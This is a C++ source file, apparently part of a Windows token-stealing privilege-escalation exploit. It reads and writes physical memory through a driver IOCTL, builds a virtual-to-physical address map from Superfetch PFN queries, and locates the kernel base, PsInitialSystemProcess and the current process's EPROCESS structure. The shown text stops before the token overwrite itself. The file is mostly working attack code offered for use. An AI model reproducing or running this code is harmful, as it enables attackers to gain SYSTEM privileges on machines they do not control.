#include "token_stealer.h"

std::unordered_map<uint64_t, uint64_t> g_va_to_pa;
HANDLE hDriver = INVALID_HANDLE_VALUE;

// Reads physical memory through the driver IOCTL interface.
bool ReadPhysical(uint64_t physAddr, void* buffer, uint32_t size) {
    DWORD returned = 0;
    uint64_t input = physAddr;
    return DeviceIoControl(hDriver, IOCTL_READ, &input, 8, buffer, size, &returned, nullptr) && returned == size;
}

// Writes physical memory through the driver IOCTL interface.
bool WritePhysical(uint64_t physAddr, const void* buffer, uint32_t size) {
    DWORD returned = 0;
    std::vector<uint8_t> input(8 + size);
    memcpy(input.data(), &physAddr, 8);
    memcpy(input.data() + 8, buffer, size);
    return DeviceIoControl(hDriver, IOCTL_WRITE, input.data(), (DWORD)input.size(), nullptr, 0, &returned, nullptr);
}

// Enables SeProfileSingleProcessPrivilege on the current process token.
bool EnableProfilePrivilege() {
    HANDLE hToken;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
        return false;

    TOKEN_PRIVILEGES tp{};
    if (!LookupPrivilegeValueW(nullptr, L"SeProfileSingleProcessPrivilege", &tp.Privileges[0].Luid)) {
        CloseHandle(hToken);
        return false;
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    bool ok = AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), nullptr, nullptr)
        && (GetLastError() == ERROR_SUCCESS);
    CloseHandle(hToken);
    return ok;
}

// Issues a Superfetch query via NtQuerySystemInformation.
NTSTATUS sfQuery(SUPERFETCH_INFORMATION_CLASS infoClass, void* buf, ULONG length, ULONG* rlen) {
    static auto NtQuerySystemInformation = (NTSTATUS(NTAPI*)(SYSTEM_INFORMATION_CLASS, PVOID, ULONG, PULONG))
        GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtQuerySystemInformation");
    if (!NtQuerySystemInformation) return 0xC0000001;

    SUPERFETCH_INFORMATION si{};
    si.Version = 45;
    si.Magic = 'kuhC';
    si.InfoClass = infoClass;
    si.Data = buf;
    si.Length = length;

    return NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)79, &si, sizeof(si), rlen);
}

// Translates a kernel virtual address to a physical address using Superfetch PFN data.
bool GetV2PTranslation(uint64_t virtualAddr, uint64_t* physicalAddr) {
    if (!EnableProfilePrivilege()) {
        std::cout << "privilege Enable failed \n";
        return false;
    }

    if (g_va_to_pa.empty()) {
        struct { ULONG_PTR base, count; } ranges[1024];
        ULONG nranges = 0;
        ULONG need = 0;

        PF_MEMORY_RANGE_INFO_V2 probe2{};
        probe2.Version = 2;
        probe2.Flags = 0;

        NTSTATUS s2 = sfQuery(SuperfetchMemoryRangesQuery, &probe2, sizeof(probe2), &need);
        printf("[*] V2 Range Query Status: 0x%08X | need: %lu\n", s2, need);

        if (s2 == (NTSTATUS)0xC0000023L && need) {
            auto buf = std::make_unique<BYTE[]>(need);
            auto* ri = (PF_MEMORY_RANGE_INFO_V2*)buf.get();
            ri->Version = 2;
            ri->Flags = 0;
            if (SUCCEEDED(sfQuery(SuperfetchMemoryRangesQuery, ri, need))) {
                nranges = ri->RangeCount;
                for (ULONG i = 0; i < nranges && i < 1024; i++) {
                    ranges[i].base = ri->Ranges[i].BasePfn;
                    ranges[i].count = ri->Ranges[i].PageCount;
                }
            }
        }

        if (!nranges) {
            PF_MEMORY_RANGE_INFO_V1 probe1{};
            probe1.Version = 1;
            NTSTATUS s1 = sfQuery(SuperfetchMemoryRangesQuery, &probe1, sizeof(probe1), &need);
            printf("[*] V1 Range Query Status: 0x%08X | need: %lu\n", s1, need);

            if (s1 == (NTSTATUS)0xC0000023L && need) {
                auto buf = std::make_unique<BYTE[]>(need);
                auto* ri = (PF_MEMORY_RANGE_INFO_V1*)buf.get();
                ri->Version = 1;
                if (SUCCEEDED(sfQuery(SuperfetchMemoryRangesQuery, ri, need))) {
                    nranges = ri->RangeCount;
                    for (ULONG i = 0; i < nranges && i < 1024; i++) {
                        ranges[i].base = ri->Ranges[i].BasePfn;
                        ranges[i].count = ri->Ranges[i].PageCount;
                    }
                }
            }
        }

        if (!nranges) {
            printf("[-] Failed to get physical memory ranges (both V1 and V2 failed)\n");
            return false;
        }

        for (ULONG r = 0; r < nranges; r++) {
            ULONG_PTR base = ranges[r].base;
            ULONG_PTR total = ranges[r].count;

            for (ULONG_PTR off = 0; off < total; off += 4096) {
                ULONG_PTR cnt = min((ULONG_PTR)4096, total - off);
                SIZE_T    blen = offsetof(PF_PFN_PRIO_REQUEST, PageData) + sizeof(MMPFN_IDENTITY) * cnt;

                auto buf = std::make_unique<BYTE[]>(blen);
                auto* req = (PF_PFN_PRIO_REQUEST*)buf.get();
                req->Version = 1;
                req->RequestFlags = 1;
                req->PfnCount = cnt;
                for (ULONG_PTR i = 0; i < cnt; i++)
                    req->PageData[i].PageFrameIndex = base + off + i;

                if (SUCCEEDED(sfQuery(SuperFetchPfnQuery, req, (ULONG)blen))) {
                    for (ULONG_PTR i = 0; i < cnt; i++) {
                        if (PVOID va = req->PageData[i].u2.VirtualAddress) {
                            UINT64 page = (UINT64)va & ~0xFFFULL;
                            UINT64 phys = (base + off + i) << 12;
                            g_va_to_pa[page] = phys;
                        }
                    }
                }
            }
        }
        printf("[+] Built map with %zu entries.\n", g_va_to_pa.size());
    }

    uint64_t aligned = virtualAddr & ~0xFFFULL;
    auto it = g_va_to_pa.find(aligned);
    if (it == g_va_to_pa.end()) {
        printf("failed to find the Physical Address of requested Virtual Address\n");
        return false;
    }
    *physicalAddr = it->second + (virtualAddr & 0xFFF);
    return true;
}

// Retrieves the base address of the loaded Windows kernel image.
uint64_t GetKernelBase() {
    LPVOID drivers[1024];
    DWORD cbNeeded;
    if (EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded) && cbNeeded < sizeof(drivers)) {
        return (uint64_t)drivers[0];
    }
    return 0;
}

// Resolves the kernel virtual address of PsInitialSystemProcess.
uint64_t GetPsInitialSystemProcessVA(uint64_t kernelBase) {
    HMODULE hKernel = LoadLibraryW(L"ntoskrnl.exe");
    if (!hKernel) return 0;
    FARPROC pUserModeAddr = GetProcAddress(hKernel, "PsInitialSystemProcess");
    if (!pUserModeAddr) {
        FreeLibrary(hKernel);
        return 0;
    }
    uint64_t rva = (uint64_t)pUserModeAddr - (uint64_t)hKernel;
    FreeLibrary(hKernel);
    return kernelBase + rva;
}

// Queries system process information for the current process entry.
uint64_t GetMyEprocessViaNtQuery() {
    auto NtQSI = (NTSTATUS(NTAPI*)(SYSTEM_INFORMATION_CLASS, PVOID, ULONG, PULONG))
        GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtQuerySystemInformation");

    ULONG size = 0;
    NtQSI((SYSTEM_INFORMATION_CLASS)5, NULL, 0, &size);
    if (size == 0) return 0;

    auto buffer = std::make_unique<BYTE[]>(size);
    if (NtQSI((SYSTEM_INFORMATION_CLASS)5, buffer.get(), size, &size) != 0) return 0;

    auto p = (SYSTEM_PROCESS_INFORMATION*)buffer.get();
    DWORD myPid = GetCurrentProcessId();

    while (true) {
        if ((DWORD)(ULONG_PTR)p->UniqueProcessId == myPid) {
            return (uint64_t)p->Reserved1[0];
        }
        if (p->NextEntryOffset == 0) break;
        p = (SYSTEM_PROCESS_INFORMATION*)((BYTE*)p + p->NextEntryOffset);
    }
    return 0;
}